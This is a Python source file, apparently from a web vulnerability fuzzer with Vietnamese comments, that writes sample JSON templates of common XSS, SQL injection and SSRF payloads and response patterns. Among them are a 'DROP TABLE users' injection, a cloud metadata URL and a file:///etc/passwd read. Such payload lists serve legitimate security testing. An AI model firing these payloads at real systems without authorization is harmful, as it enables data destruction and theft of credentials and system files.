
# File: src/config/template_creator.py
import os
import json


def create_sample_templates(templates_dir: str = "src/template"):
    """
    Tạo các template mẫu cho việc fuzzing
    
    Args:
        templates_dir: Thư mục đầu ra để lưu template
    """
    os.makedirs(templates_dir, exist_ok=True)
    
    # Template cho XSS
    xss_template = {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Kiểm tra lỗ hổng XSS bằng các payload phổ biến",
        "payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>"
        ],
        "patterns": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ]
    }
    
    # Template cho SQL Injection
    sqli_template = {
        "name": "SQL Injection",
        "description": "Kiểm tra lỗ hổng SQL Injection bằng các payload phổ biến",
        "payloads": [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "' UNION SELECT 1,2,3 --",
            "1; DROP TABLE users"
        ],
        "patterns": [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3"
        ]
    }
    
    # Template cho SSRF
    ssrf_template = {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Kiểm tra lỗ hổng SSRF bằng các payload phổ biến",
        "payloads": [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ],
        "patterns": [
            "root:",
            "privateIp",
            "localhost",
            "Internal Server Error"
        ]
    }
    
    # Lưu các template vào tệp
    with open(os.path.join(templates_dir, "xss.json"), 'w') as f:
        json.dump(xss_template, f, indent=4)
    
    with open(os.path.join(templates_dir, "sqli.json"), 'w') as f:
        json.dump(sqli_template, f, indent=4)
    
    with open(os.path.join(templates_dir, "ssrf.json"), 'w') as f:
        json.dump(ssrf_template, f, indent=4)
    
    print(f"[+] Đã tạo các template mẫu trong thư mục '{templates_dir}'")